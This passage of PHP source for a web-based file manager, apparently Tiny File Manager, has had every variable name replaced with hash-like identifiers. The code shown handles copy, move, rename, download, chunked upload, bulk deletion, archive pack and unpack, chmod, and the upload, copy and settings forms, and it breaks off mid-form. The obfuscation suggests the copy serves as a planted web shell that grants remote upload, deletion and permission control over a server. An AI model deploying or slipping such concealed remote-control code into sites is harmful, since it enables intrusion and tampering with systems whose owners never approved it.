    $v09a6b04a = isset($v51e4dd52['move']);
    $v09a6b04a = fm_clean_path(urldecode($v09a6b04a));
    // copy/move/duplicate
    if ($v0b5a2029 != $vf25f7e4e) {
        $vd249251d = trim(FM_PATH . '/' . basename($v0b5a2029), '/');
        if ($v09a6b04a) { // Move and to != from so just perform move
            $v48cc2ccd = fm_rename($v0b5a2029, $vf25f7e4e);
            if ($v48cc2ccd) {
                fm_set_msg(sprintf(lng('Moved from').' <b>%s</b> '.lng('to').' <b>%s</b>', fm_enc($vee6d2820), fm_enc($vd249251d)));
            } elseif ($v48cc2ccd === null) {
                fm_set_msg(lng('File or folder with this path already exists'), 'alert');
            } else {
                fm_set_msg(sprintf(lng('Error while moving from').' <b>%s</b> '.lng('to').' <b>%s</b>', fm_enc($vee6d2820), fm_enc($vd249251d)), 'error');
            }
        } else { // Not move and to != from so copy with original name
            if (fm_rcopy($v0b5a2029, $vf25f7e4e)) {
                fm_set_msg(sprintf(lng('Copied from').' <b>%s</b> '.lng('to').' <b>%s</b>', fm_enc($vee6d2820), fm_enc($vd249251d)));
            } else {
                fm_set_msg(sprintf(lng('Error while copying from').' <b>%s</b> '.lng('to').' <b>%s</b>', fm_enc($vee6d2820), fm_enc($vd249251d)), 'error');
            }
        }
    } else {
       if (!$v09a6b04a){ //Not move and to = from so duplicate
            $vd249251d = trim(FM_PATH . '/' . basename($v0b5a2029), '/');
            $vfd360390 = pathinfo($v0b5a2029);
            $v3e7c6c3f = '';
            if(!is_dir($v0b5a2029)){
               $v3e7c6c3f = '.'.$vfd360390['extension'];
            }
            //Create new name for duplicate
            $v3cec86d0 = $vfd360390['dirname'].'/'.$vfd360390['filename'].'-'.date('YmdHis').$v3e7c6c3f;
            $vb73d9ddb = 0;
            $vee75aea8 = 1000;
            // Check if a file with the duplicate name already exists, if so, make new name (edge case...)
            while(file_exists($v3cec86d0) & $vb73d9ddb < $vee75aea8){
               $vfd360390 = pathinfo($v3cec86d0);
               $v3cec86d0 = $vfd360390['dirname'].'/'.$vfd360390['filename'].'-copy'.$v3e7c6c3f;
               $vb73d9ddb++;
            }
            if (fm_rcopy($v0b5a2029, $v3cec86d0, False)) {
                fm_set_msg(sprintf('Copied from <b>%s</b> to <b>%s</b>', fm_enc($vee6d2820), fm_enc($v3cec86d0)));
            } else {
                fm_set_msg(sprintf('Error while copying from <b>%s</b> to <b>%s</b>', fm_enc($vee6d2820), fm_enc($v3cec86d0)), 'error');
            }
       }
       else{
           fm_set_msg(lng('Paths must be not equal'), 'alert');
       }
    }
    $v7e618b4f=FM_PATH; fm_redirect(FM_SELF_URL . '?p=' . urlencode($v7e618b4f));
}

// Mass copy files/ folders
if (isset($v67987c65['file'], $v67987c65['copy_to'], $v67987c65['finish'], $v67987c65['token']) && !FM_READONLY) {

    if(!verifyToken($v67987c65['token'])) {
        fm_set_msg(lng('Invalid Token.'), 'error');
    }
    
    // from
    $v5424ec5f = FM_ROOT_PATH;
    if (FM_PATH != '') {
        $v5424ec5f .= '/' . FM_PATH;
    }
    // to
    $ve592fc5e = FM_ROOT_PATH;
    $v94d6df86 = fm_clean_path($v67987c65['copy_to']);
    if ($v94d6df86 != '') {
        $ve592fc5e .= '/' . $v94d6df86;
    }
    if ($v5424ec5f == $ve592fc5e) {
        fm_set_msg(lng('Paths must be not equal'), 'alert');
        $v7e618b4f=FM_PATH; fm_redirect(FM_SELF_URL . '?p=' . urlencode($v7e618b4f));
    }
    if (!is_dir($ve592fc5e)) {
        if (!fm_mkdir($ve592fc5e, true)) {
            fm_set_msg('Unable to create destination folder', 'error');
            $v7e618b4f=FM_PATH; fm_redirect(FM_SELF_URL . '?p=' . urlencode($v7e618b4f));
        }
    }
    // move?
    $v09a6b04a = isset($v67987c65['move']);
    // copy/move
    $vdd8adc81 = 0;
    $v87c5f9cc = $v67987c65['file'];
    if (is_array($v87c5f9cc) && count($v87c5f9cc)) {
        foreach ($v87c5f9cc as $v1741b918) {
            if ($v1741b918 != '') {
                $v1741b918 = fm_clean_path($v1741b918);
                // abs path from
                $v0b5a2029 = $v5424ec5f . '/' . $v1741b918;
                // abs path to
                $vf25f7e4e = $ve592fc5e . '/' . $v1741b918;
                // do
                if ($v09a6b04a) {
                    $v48cc2ccd = fm_rename($v0b5a2029, $vf25f7e4e);
                    if ($v48cc2ccd === false) {
                        $vdd8adc81++;
                    }
                } else {
                    if (!fm_rcopy($v0b5a2029, $vf25f7e4e)) {
                        $vdd8adc81++;
                    }
                }
            }
        }
        if ($vdd8adc81 == 0) {
            $v8a0e089a = $v09a6b04a ? 'Selected files and folders moved' : 'Selected files and folders copied';
            fm_set_msg($v8a0e089a);
        } else {
            $v8a0e089a = $v09a6b04a ? 'Error while moving items' : 'Error while copying items';
            fm_set_msg($v8a0e089a, 'error');
        }
    } else {
        fm_set_msg(lng('Nothing selected'), 'alert');
    }
    $v7e618b4f=FM_PATH; fm_redirect(FM_SELF_URL . '?p=' . urlencode($v7e618b4f));
}

// Rename
if (isset($v67987c65['rename_from'], $v67987c65['rename_to'], $v67987c65['token']) && !FM_READONLY) {
    if(!verifyToken($v67987c65['token'])) {
        fm_set_msg("Invalid Token.", 'error');
    }
    // old name
    $v3abf70cb = urldecode($v67987c65['rename_from']);
    $v3abf70cb = fm_clean_path($v3abf70cb);
    $v3abf70cb = str_replace('/', '', $v3abf70cb);
    // new name
    $vd97e09ef = urldecode($v67987c65['rename_to']);
    $vd97e09ef = fm_clean_path(strip_tags($vd97e09ef));
    $vd97e09ef = str_replace('/', '', $vd97e09ef);
    // path
    $v5424ec5f = FM_ROOT_PATH;
    if (FM_PATH != '') {
        $v5424ec5f .= '/' . FM_PATH;
    }
    // rename
    if (fm_isvalid_filename($vd97e09ef) && $v3abf70cb != '' && $vd97e09ef != '') {
        if (fm_rename($v5424ec5f . '/' . $v3abf70cb, $v5424ec5f . '/' . $vd97e09ef)) {
            fm_set_msg(sprintf(lng('Renamed from').' <b>%s</b> '. lng('to').' <b>%s</b>', fm_enc($v3abf70cb), fm_enc($vd97e09ef)));
        } else {
            fm_set_msg(sprintf(lng('Error while renaming from').' <b>%s</b> '. lng('to').' <b>%s</b>', fm_enc($v3abf70cb), fm_enc($vd97e09ef)), 'error');
        }
    } else {
        fm_set_msg(lng('Invalid characters in file name'), 'error');
    }
    $v7e618b4f=FM_PATH; fm_redirect(FM_SELF_URL . '?p=' . urlencode($v7e618b4f));
}

// Download
if (isset($v51e4dd52['dl'], $v67987c65['token'])) {
    if(!verifyToken($v67987c65['token'])) {
        fm_set_msg("Invalid Token.", 'error');
    }

    $v8f9b5e6b = urldecode($v51e4dd52['dl']);
    $v8f9b5e6b = fm_clean_path($v8f9b5e6b);
    $v8f9b5e6b = str_replace('/', '', $v8f9b5e6b);
    $v5424ec5f = FM_ROOT_PATH;
    if (FM_PATH != '') {
        $v5424ec5f .= '/' . FM_PATH;
    }
    if ($v8f9b5e6b != '' && is_file($v5424ec5f . '/' . $v8f9b5e6b)) {
        fm_download_file($v5424ec5f . '/' . $v8f9b5e6b, $v8f9b5e6b, 1024);
        exit;
    } else {
        fm_set_msg(lng('File not found'), 'error');
        $v7e618b4f=FM_PATH; fm_redirect(FM_SELF_URL . '?p=' . urlencode($v7e618b4f));
    }
}

// Upload
if (!empty($v4c6b44f6) && !FM_READONLY) {
    if(isset($v67987c65['token'])) {
        if(!verifyToken($v67987c65['token'])) {
            $v00418a20 = array ('status' => 'error','info' => "Invalid Token.");
            echo json_encode($v00418a20); exit();
        }
    } else {
        $v00418a20 = array ('status' => 'error','info' => "Token Missing.");
        echo json_encode($v00418a20); exit();
    }

    $v28f63658 = $v67987c65['dzchunkindex'];
    $va7babb54 = $v67987c65['dztotalchunkcount'];
    $va6072145 = fm_clean_path($v45647128['fullpath']);

    $v1741b918 = $v4c6b44f6;
    $v5424ec5f = FM_ROOT_PATH;
    $ve91ebbc4 = DIRECTORY_SEPARATOR;
    if (FM_PATH != '') {
        $v5424ec5f .= '/' . FM_PATH;
    }

    $vdd8adc81 = 0;
    $vf209a06f = 0;
    $v0bf4bff0 = (FM_UPLOAD_EXTENSION) ? explode(',', FM_UPLOAD_EXTENSION) : false;
    $v00418a20 = array (
        'status' => 'error',
        'info'   => 'Oops! Try again'
    );

    $vd4413dfd = $v1741b918['file']['name'];
    $v19d68698 = $v1741b918['file']['tmp_name'];
    $v00b4247d = pathinfo($vd4413dfd, PATHINFO_FILENAME) != '' ? strtolower(pathinfo($vd4413dfd, PATHINFO_EXTENSION)) : '';
    $ve0c1a0ea = ($v0bf4bff0) ? in_array($v00b4247d, $v0bf4bff0) : true;

    if(!fm_isvalid_filename($vd4413dfd) && !fm_isvalid_filename($va6072145)) {
        $v00418a20 = array (
            'status'    => 'error',
            'info'      => "Invalid File name!",
        );
        echo json_encode($v00418a20); exit();
    }

    $veb8a09f6 = $v5424ec5f . $ve91ebbc4;
    if ( is_writable($veb8a09f6) ) {
        $vc60f4630 = $v5424ec5f . '/' . basename($va6072145);
        $v31b604a5 = substr($vc60f4630, 0, strrpos($vc60f4630, "/"));

        if (!is_dir($v31b604a5)) {
            $v3abf70cb = umask(0);
            mkdir($v31b604a5, 0777, true);
            umask($v3abf70cb);
        }

        if (empty($v1741b918['file']['error']) && !empty($v19d68698) && $v19d68698 != 'none' && $ve0c1a0ea) {
            if ($va7babb54){
                $vd5aa158c = @fopen("{$vc60f4630}.part", $v28f63658 == 0 ? "wb" : "ab");
                if ($vd5aa158c) {
                    $v8a1590ba = @fopen($v19d68698, "rb");
                    if ($v8a1590ba) {
                        if (PHP_VERSION_ID < 80009) {
                            // workaround https://bugs.php.net/bug.php?id=81145
                            do {
                                for (;;) {
                                    $v8b10bba4 = fread($v8a1590ba, 4096);
                                    if ($v8b10bba4 === false || $v8b10bba4 === '') {
                                        break;
                                    }
                                    fwrite($vd5aa158c, $v8b10bba4);
                                }
                            } while (!feof($v8a1590ba));
                        } else {
                            stream_copy_to_stream($v8a1590ba, $vd5aa158c);
                        }
                        $v00418a20 = array (
                            'status'    => 'success',
                            'info' => "file upload successful"
                        );
                    } else {
                        $v00418a20 = array (
                        'status'    => 'error',
                        'info' => "failed to open output stream",
                        'errorDetails' => error_get_last()
                        );
                    }
                    @fclose($v8a1590ba);
                    @fclose($vd5aa158c);
                    @unlink($v19d68698);

                    $v00418a20 = array (
                        'status'    => 'success',
                        'info' => "file upload successful"
                    );
                } else {
                    $v00418a20 = array (
                        'status'    => 'error',
                        'info' => "failed to open output stream"
                        );
                }

                if ($v28f63658 == $va7babb54 - 1) {
                    if (file_exists ($vc60f4630)) {
                        $v2c49247f = $v00b4247d ? '.'.$v00b4247d : '';
                        $v5a0c7c5c = $v5424ec5f . '/' . basename($va6072145, $v2c49247f) .'_'. date('ymdHis'). $v2c49247f;
                    } else {
                        $v5a0c7c5c = $vc60f4630;
                    }
                    rename("{$vc60f4630}.part", $v5a0c7c5c);
                }

            } else if (move_uploaded_file($v19d68698, $vc60f4630)) {
                // Be sure that the file has been uploaded
                if ( file_exists($vc60f4630) ) {
                    $v00418a20 = array (
                        'status'    => 'success',
                        'info' => "file upload successful"
                    );
                } else {
                    $v00418a20 = array (
                        'status' => 'error',
                        'info'   => 'Couldn\'t upload the requested file.'
                    );
                }
            } else {
                $v00418a20 = array (
                    'status'    => 'error',
                    'info'      => "Error while uploading files. Uploaded files $vf209a06f",
                );
            }
        }
    } else {
        $v00418a20 = array (
            'status' => 'error',
            'info'   => 'The specified folder for upload isn\'t writeable.'
        );
    }
    // Return the response
    echo json_encode($v00418a20);
    exit();
}

// Mass deleting
if (isset($v67987c65['group'], $v67987c65['delete'], $v67987c65['token']) && !FM_READONLY) {

    if(!verifyToken($v67987c65['token'])) {
        fm_set_msg(lng("Invalid Token."), 'error');
    }

    $v5424ec5f = FM_ROOT_PATH;
    if (FM_PATH != '') {
        $v5424ec5f .= '/' . FM_PATH;
    }

    $vdd8adc81 = 0;
    $v87c5f9cc = $v67987c65['file'];
    if (is_array($v87c5f9cc) && count($v87c5f9cc)) {
        foreach ($v87c5f9cc as $v1741b918) {
            if ($v1741b918 != '') {
                $v9e13685a = $v5424ec5f . '/' . $v1741b918;
                if (!fm_rdelete($v9e13685a)) {
                    $vdd8adc81++;
                }
            }
        }
        if ($vdd8adc81 == 0) {
            fm_set_msg(lng('Selected files and folder deleted'));
        } else {
            fm_set_msg(lng('Error while deleting items'), 'error');
        }
    } else {
        fm_set_msg(lng('Nothing selected'), 'alert');
    }

    $v7e618b4f=FM_PATH; fm_redirect(FM_SELF_URL . '?p=' . urlencode($v7e618b4f));
}

// Pack files zip, tar
if (isset($v67987c65['group'], $v67987c65['token']) && (isset($v67987c65['zip']) || isset($v67987c65['tar'])) && !FM_READONLY) {

    if(!verifyToken($v67987c65['token'])) {
        fm_set_msg(lng("Invalid Token."), 'error');
    }

    $v5424ec5f = FM_ROOT_PATH;
    $v00b4247d = 'zip';
    if (FM_PATH != '') {
        $v5424ec5f .= '/' . FM_PATH;
    }

    //set pack type
    $v00b4247d = isset($v67987c65['tar']) ? 'tar' : 'zip';

    if (($v00b4247d == "zip" && !class_exists('ZipArchive')) || ($v00b4247d == "tar" && !class_exists('PharData'))) {
        fm_set_msg(lng('Operations with archives are not available'), 'error');
        $v7e618b4f=FM_PATH; fm_redirect(FM_SELF_URL . '?p=' . urlencode($v7e618b4f));
    }

    $v87c5f9cc = $v67987c65['file'];
    $va4d43481 = array();

    // clean path
    foreach($v87c5f9cc as $v81f430be){
        array_push($va4d43481, fm_clean_path($v81f430be));
    }
    
    $v87c5f9cc = $va4d43481;
    
    if (!empty($v87c5f9cc)) {
        chdir($v5424ec5f);

        if (count($v87c5f9cc) == 1) {
            $vf3e4a940 = reset($v87c5f9cc);
            $vf3e4a940 = basename($vf3e4a940);
            $va5f85bc8 = $vf3e4a940 . '_' . date('ymd_His') . '.'.$v00b4247d;
        } else {
            $va5f85bc8 = 'archive_' . date('ymd_His') . '.'.$v00b4247d;
        }

        if($v00b4247d == 'zip') {
            $v3e7bd5b7 = new FM_Zipper();
            $v19415ac3 = $v3e7bd5b7->create($va5f85bc8, $v87c5f9cc);
        } elseif ($v00b4247d == 'tar') {
            $v3fac7e70 = new FM_Zipper_Tar();
            $v19415ac3 = $v3fac7e70->create($va5f85bc8, $v87c5f9cc);
        }

        if ($v19415ac3) {
            fm_set_msg(sprintf(lng('Archive').' <b>%s</b> '.lng('Created'), fm_enc($va5f85bc8)));
        } else {
            fm_set_msg(lng('Archive not created'), 'error');
        }
    } else {
        fm_set_msg(lng('Nothing selected'), 'alert');
    }

    $v7e618b4f=FM_PATH; fm_redirect(FM_SELF_URL . '?p=' . urlencode($v7e618b4f));
}

// Unpack zip, tar
if (isset($v67987c65['unzip'], $v67987c65['token']) && !FM_READONLY) {

    if(!verifyToken($v67987c65['token'])) {
        fm_set_msg(lng("Invalid Token."), 'error');
    }

    $v6dac25de = urldecode($v67987c65['unzip']);
    $v6dac25de = fm_clean_path($v6dac25de);
    $v6dac25de = str_replace('/', '', $v6dac25de);
    $v9757e342 = false;

    $v5424ec5f = FM_ROOT_PATH;
    if (FM_PATH != '') {
        $v5424ec5f .= '/' . FM_PATH;
    }

    if ($v6dac25de != '' && is_file($v5424ec5f . '/' . $v6dac25de)) {
        $v59cac84e = $v5424ec5f . '/' . $v6dac25de;
        $v00b4247d = pathinfo($v59cac84e, PATHINFO_EXTENSION);
        $v9757e342 = true;
    } else {
        fm_set_msg(lng('File not found'), 'error');
    }

    if (($v00b4247d == "zip" && !class_exists('ZipArchive')) || ($v00b4247d == "tar" && !class_exists('PharData'))) {
        fm_set_msg(lng('Operations with archives are not available'), 'error');
        $v7e618b4f=FM_PATH; fm_redirect(FM_SELF_URL . '?p=' . urlencode($v7e618b4f));
    }

    if ($v9757e342) {
        //to folder
        $vb2d9d605 = '';
        if (isset($v67987c65['tofolder'])) {
            $vb2d9d605 = pathinfo($v59cac84e, PATHINFO_FILENAME);
            if (fm_mkdir($v5424ec5f . '/' . $vb2d9d605, true)) {
                $v5424ec5f .= '/' . $vb2d9d605;
            }
        }

        if($v00b4247d == "zip") {
            $v3e7bd5b7 = new FM_Zipper();
            $v19415ac3 = $v3e7bd5b7->unzip($v59cac84e, $v5424ec5f);
        } elseif ($v00b4247d == "tar") {
            try {
                $v7d02aaf1 = new PharData($v59cac84e);
                if (@$v7d02aaf1->extractTo($v5424ec5f,null, true)) {
                    $v19415ac3 = true;
                } else {
                    $v19415ac3 = false;
                }
            } catch (Exception $vb8673196) {
                //TODO:: need to handle the error
                $v19415ac3 = true;
            }
        }

        if ($v19415ac3) {
            fm_set_msg(lng('Archive unpacked'));
        } else {
            fm_set_msg(lng('Archive not unpacked'), 'error');
        }
    } else {
        fm_set_msg(lng('File not found'), 'error');
    }
    $v7e618b4f=FM_PATH; fm_redirect(FM_SELF_URL . '?p=' . urlencode($v7e618b4f));
}

// Change Perms (not for Windows)
if (isset($v67987c65['chmod'], $v67987c65['token']) && !FM_READONLY && !FM_IS_WIN) {

    if(!verifyToken($v67987c65['token'])) {
        fm_set_msg(lng("Invalid Token."), 'error');
    }
    
    $v5424ec5f = FM_ROOT_PATH;
    if (FM_PATH != '') {
        $v5424ec5f .= '/' . FM_PATH;
    }

    $v81f430be = $v67987c65['chmod'];
    $v81f430be = fm_clean_path($v81f430be);
    $v81f430be = str_replace('/', '', $v81f430be);
    if ($v81f430be == '' || (!is_file($v5424ec5f . '/' . $v81f430be) && !is_dir($v5424ec5f . '/' . $v81f430be))) {
        fm_set_msg(lng('File not found'), 'error');
        $v7e618b4f=FM_PATH; fm_redirect(FM_SELF_URL . '?p=' . urlencode($v7e618b4f));
    }

    $v772f173d = 0;
    if (!empty($v67987c65['ur'])) {
        $v772f173d |= 0400;
    }
    if (!empty($v67987c65['uw'])) {
        $v772f173d |= 0200;
    }
    if (!empty($v67987c65['ux'])) {
        $v772f173d |= 0100;
    }
    if (!empty($v67987c65['gr'])) {
        $v772f173d |= 0040;
    }
    if (!empty($v67987c65['gw'])) {
        $v772f173d |= 0020;
    }
    if (!empty($v67987c65['gx'])) {
        $v772f173d |= 0010;
    }
    if (!empty($v67987c65['or'])) {
        $v772f173d |= 0004;
    }
    if (!empty($v67987c65['ow'])) {
        $v772f173d |= 0002;
    }
    if (!empty($v67987c65['ox'])) {
        $v772f173d |= 0001;
    }

    if (@chmod($v5424ec5f . '/' . $v81f430be, $v772f173d)) {
        fm_set_msg(lng('Permissions changed'));
    } else {
        fm_set_msg(lng('Permissions not changed'), 'error');
    }

    $v7e618b4f=FM_PATH; fm_redirect(FM_SELF_URL . '?p=' . urlencode($v7e618b4f));
}

/*************************** ACTIONS ***************************/

// get current path
$v5424ec5f = FM_ROOT_PATH;
if (FM_PATH != '') {
    $v5424ec5f .= '/' . FM_PATH;
}

// check path
if (!is_dir($v5424ec5f)) {
    fm_redirect(FM_SELF_URL . '?p=');
}

// get parent folder
$ve3964bd5 = fm_get_parent_path(FM_PATH);

$v4a9de2ac = is_readable($v5424ec5f) ? scandir($v5424ec5f) : array();
$v3a6ba9de = array();
$v87c5f9cc = array();
$vbc15dbf2 = array_slice(explode("/",$v5424ec5f), -1)[0];
if (is_array($v4a9de2ac) && fm_is_exclude_items($vbc15dbf2)) {
    foreach ($v4a9de2ac as $v81f430be) {
        if ($v81f430be == '.' || $v81f430be == '..') {
            continue;
        }
        if (!FM_SHOW_HIDDEN && substr($v81f430be, 0, 1) === '.') {
            continue;
        }
        $v9e13685a = $v5424ec5f . '/' . $v81f430be;
        if (@is_file($v9e13685a) && fm_is_exclude_items($v81f430be)) {
            $v87c5f9cc[] = $v81f430be;
        } elseif (@is_dir($v9e13685a) && $v81f430be != '.' && $v81f430be != '..' && fm_is_exclude_items($v81f430be)) {
            $v3a6ba9de[] = $v81f430be;
        }
    }
}

if (!empty($v87c5f9cc)) {
    natcasesort($v87c5f9cc);
}
if (!empty($v3a6ba9de)) {
    natcasesort($v3a6ba9de);
}

// upload form
if (isset($v51e4dd52['upload']) && !FM_READONLY) {
    fm_show_header(); // HEADER
    fm_show_nav_path(FM_PATH); // current path
    //get the allowed file extensions
    function getUploadExt() {
        $v4c94e197 = explode(',', FM_UPLOAD_EXTENSION);
        if(FM_UPLOAD_EXTENSION && $v4c94e197) {
            array_walk($v4c94e197, function(&$v9ca1c5be) {$v9ca1c5be = ".$v9ca1c5be";});
            return implode(',', $v4c94e197);
        }
        return '';
    }
    ?>
    <?php print_external('css-dropzone'); ?>
    <div class="path">

        <div class="card mb-2 fm-upload-wrapper <?php echo fm_get_theme(); ?>">
            <div class="card-header">
                <ul class="nav nav-tabs card-header-tabs">
                    <li class="nav-item">
                        <a class="nav-link active" href="#fileUploader" data-target="#fileUploader"><i class="fa fa-arrow-circle-o-up"></i> <?php echo lng('UploadingFiles') ?></a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="#urlUploader" class="js-url-upload" data-target="#urlUploader"><i class="fa fa-link"></i> <?php echo lng('Upload from URL') ?></a>
                    </li>
                </ul>
            </div>
            <div class="card-body">
                <p class="card-text">
                    <a href="?p=<?php echo FM_PATH ?>" class="float-right"><i class="fa fa-chevron-circle-left go-back"></i> <?php echo lng('Back')?></a>
                    <strong><?php echo lng('DestinationFolder') ?></strong>: <?php echo fm_enc(fm_convert_win(FM_PATH)) ?>
                </p>

                <form action="<?php echo htmlspecialchars(FM_SELF_URL) . '?p=' . fm_enc(FM_PATH) ?>" class="dropzone card-tabs-container" id="fileUploader" enctype="multipart/form-data">
                    <input type="hidden" name="p" value="<?php echo fm_enc(FM_PATH) ?>">
                    <input type="hidden" name="fullpath" id="fullpath" value="<?php echo fm_enc(FM_PATH) ?>">
                    <input type="hidden" name="token" value="<?php echo $vbc4af197['token']; ?>">
                    <div class="fallback">
                        <input name="file" type="file" multiple/>
                    </div>
                </form>

                <div class="upload-url-wrapper card-tabs-container hidden" id="urlUploader">
                    <form id="js-form-url-upload" class="row row-cols-lg-auto g-3 align-items-center" onsubmit="return upload_from_url(this);" method="POST" action="">
                        <input type="hidden" name="type" value="upload" aria-label="hidden" aria-hidden="true">
                        <input type="url" placeholder="URL" name="uploadurl" required class="form-control" style="width: 80%">
                        <input type="hidden" name="token" value="<?php echo $vbc4af197['token']; ?>">
                        <button type="submit" class="btn btn-primary ms-3"><?php echo lng('Upload') ?></button>
                        <div class="lds-facebook"><div></div><div></div><div></div></div>
                    </form>
                    <div id="js-url-upload__list" class="col-9 mt-3"></div>
                </div>
            </div>
        </div>
    </div>
    <?php print_external('js-dropzone'); ?>
    <script>
        Dropzone.options.fileUploader = {
            chunking: true,
            chunkSize: <?php echo UPLOAD_CHUNK_SIZE; ?>,
            forceChunking: true,
            retryChunks: true,
            retryChunksLimit: 3,
            parallelUploads: 1,
            parallelChunkUploads: false,
            timeout: 120000,
            maxFilesize: "<?php echo MAX_UPLOAD_SIZE; ?>",
            acceptedFiles : "<?php echo getUploadExt() ?>",
            init: function () {
                this.on("sending", function (file, xhr, formData) {
                    let _path = (file.fullPath) ? file.fullPath : file.name;
                    document.getElementById("fullpath").value = _path;
                    xhr.ontimeout = (function() {
                        toast('Error: Server Timeout');
                    });
                }).on("success", function (res) {
                    let _response = JSON.parse(res.xhr.response);

                    if(_response.status == "error") {
                        toast(_response.info);
                    }
                }).on("error", function(file, response) {
                    toast(response);
                });
            }
        }
    </script>
    <?php
    fm_show_footer();
    exit;
}

// copy form POST
if (isset($v67987c65['copy']) && !FM_READONLY) {
    $ve76b0fe7 = isset($v67987c65['file']) ? $v67987c65['file'] : null;
    if (!is_array($ve76b0fe7) || empty($ve76b0fe7)) {
        fm_set_msg(lng('Nothing selected'), 'alert');
        $v7e618b4f=FM_PATH; fm_redirect(FM_SELF_URL . '?p=' . urlencode($v7e618b4f));
    }

    fm_show_header(); // HEADER
    fm_show_nav_path(FM_PATH); // current path
    ?>
    <div class="path">
        <div class="card <?php echo fm_get_theme(); ?>">
            <div class="card-header">
                <h6><?php echo lng('Copying') ?></h6>
            </div>
            <div class="card-body">
                <form action="" method="post">
                    <input type="hidden" name="p" value="<?php echo fm_enc(FM_PATH) ?>">
                    <input type="hidden" name="finish" value="1">
                    <?php
                    foreach ($ve76b0fe7 as $v34e31415) {
                        echo '<input type="hidden" name="file[]" value="' . fm_enc($v34e31415) . '">' . PHP_EOL;
                    }
                    ?>
                    <p class="break-word"><strong><?php echo lng('Files') ?></strong>: <b><?php echo implode('</b>, <b>', $ve76b0fe7) ?></b></p>
                    <p class="break-word"><strong><?php echo lng('SourceFolder') ?></strong>: <?php echo fm_enc(fm_convert_win(FM_ROOT_PATH . '/' . FM_PATH)) ?><br>
                        <label for="inp_copy_to"><strong><?php echo lng('DestinationFolder') ?></strong>:</label>
                        <?php echo FM_ROOT_PATH ?>/<input type="text" name="copy_to" id="inp_copy_to" value="<?php echo fm_enc(FM_PATH) ?>">
                    </p>
                    <p class="custom-checkbox custom-control"><input type="checkbox" name="move" value="1" id="js-move-files" class="custom-control-input"><label for="js-move-files" class="custom-control-label ms-2"> <?php echo lng('Move') ?></label></p>
                    <p>
                        <b><a href="?p=<?php echo urlencode(FM_PATH) ?>" class="btn btn-outline-danger"><i class="fa fa-times-circle"></i> <?php echo lng('Cancel') ?></a></b>&nbsp;
                        <input type="hidden" name="token" value="<?php echo $vbc4af197['token']; ?>">
                        <button type="submit" class="btn btn-success"><i class="fa fa-check-circle"></i> <?php echo lng('Copy') ?></button> 
                    </p>
                </form>
            </div>
        </div>
    </div>
    <?php
    fm_show_footer();
    exit;
}

// copy form
if (isset($v51e4dd52['copy']) && !isset($v51e4dd52['finish']) && !FM_READONLY) {
    $vee6d2820 = $v51e4dd52['copy'];
    $vee6d2820 = fm_clean_path($vee6d2820);
    if ($vee6d2820 == '' || !file_exists(FM_ROOT_PATH . '/' . $vee6d2820)) {
        fm_set_msg(lng('File not found'), 'error');
        $v7e618b4f=FM_PATH; fm_redirect(FM_SELF_URL . '?p=' . urlencode($v7e618b4f));
    }

    fm_show_header(); // HEADER
    fm_show_nav_path(FM_PATH); // current path
    ?>
    <div class="path">
        <p><b>Copying</b></p>
        <p class="break-word">
            <strong>Source path:</strong> <?php echo fm_enc(fm_convert_win(FM_ROOT_PATH . '/' . $vee6d2820)) ?><br>
            <strong>Destination folder:</strong> <?php echo fm_enc(fm_convert_win(FM_ROOT_PATH . '/' . FM_PATH)) ?>
        </p>
        <p>
            <b><a href="?p=<?php echo urlencode(FM_PATH) ?>&amp;copy=<?php echo urlencode($vee6d2820) ?>&amp;finish=1"><i class="fa fa-check-circle"></i> Copy</a></b> &nbsp;
            <b><a href="?p=<?php echo urlencode(FM_PATH) ?>&amp;copy=<?php echo urlencode($vee6d2820) ?>&amp;finish=1&amp;move=1"><i class="fa fa-check-circle"></i> Move</a></b> &nbsp;
            <b><a href="?p=<?php echo urlencode(FM_PATH) ?>" class="text-danger"><i class="fa fa-times-circle"></i> Cancel</a></b>
        </p>
        <p><i><?php echo lng('Select folder') ?></i></p>
        <ul class="folders break-word">
            <?php
            if ($ve3964bd5 !== false) {
                ?>
                <li><a href="?p=<?php echo urlencode($ve3964bd5) ?>&amp;copy=<?php echo urlencode($vee6d2820) ?>"><i class="fa fa-chevron-circle-left"></i> ..</a></li>
                <?php
            }
            foreach ($v3a6ba9de as $v1741b918) {
                ?>
                <li>
                    <a href="?p=<?php echo urlencode(trim(FM_PATH . '/' . $v1741b918, '/')) ?>&amp;copy=<?php echo urlencode($vee6d2820) ?>"><i class="fa fa-folder-o"></i> <?php echo fm_convert_win($v1741b918) ?></a></li>
                <?php
            }
            ?>
        </ul>
    </div>
    <?php
    fm_show_footer();
    exit;
}

if (isset($v51e4dd52['settings']) && !FM_READONLY) {
    fm_show_header(); // HEADER
    fm_show_nav_path(FM_PATH); // current path
    global $ve4627ce1, $vdcd4149e, $v248427d4;
    ?>

    <div class="col-md-8 offset-md-2 pt-3">
        <div class="card mb-2 <?php echo fm_get_theme(); ?>">
            <h6 class="card-header d-flex justify-content-between">
                <span><i class="fa fa-cog"></i>  <?php echo lng('Settings') ?></span>
                <a href="?p=<?php echo FM_PATH ?>" class="text-danger"><i class="fa fa-times-circle-o"></i> <?php echo lng('Cancel')?></a>
            </h6>
            <div class="card-body">
                <form id="js-settings-form" action="" method="post" data-type="ajax" onsubmit="return save_settings(this)">
                    <input type="hidden" name="type" value="settings" aria-label="hidden" aria-hidden="true">
                    <div class="form-group row">
                        <label for="js-language" class="col-sm-3 col-form-label"><?php echo lng('Language') ?></label>
                        <div class="col-sm-5">
                            <select class="form-select" id="js-language" name="js-language">
                                <?php
                                function getSelected($v2af65716) {
                                    global $vdcd4149e;
                                    return ($vdcd4149e == $v2af65716) ? 'selected' : '';
                                }
                                foreach ($v248427d4 as $vae482326 => $v577689fd) {
                                    echo "<option value='$vae482326' ".getSelected($vae482326).">$v577689fd</option>";
                                }
                                ?>
                            </select>
                        </div>
                    </div>
                    <div class="mt-3 mb-3 row ">
                        <label for="js-error-report" class="col-sm-3 col-form-label"><?php echo lng('ErrorReporting') ?></label>
                        <div class="col-sm-9">
                            <div class="form-check form-switch">
                              <input class="form-check-input" type="checkbox" role="switch" id="js-error-report" name="js-error-report" value="true" <?php echo $v2eaa8286 ? 'checked' : ''; ?> />
                            </div>
                        </div>
                    </div>

                    <div class="mb-3 row">
                        <label for="js-show-hidden" class="col-sm-3 col-form-label"><?php echo lng('ShowHiddenFiles') ?></label>
                        <div class="col-sm-9">
                            <div class="form-check form-switch">
                              <input class="form-check-input" type="checkbox" role="switch" id="js-show-hidden" name="js-show-hidden" value="true" <?php echo $vdb523aae ? 'checked' : ''; ?> />
                            </div>
                        </div>
                    </div>

                    <div class="mb-3 row">
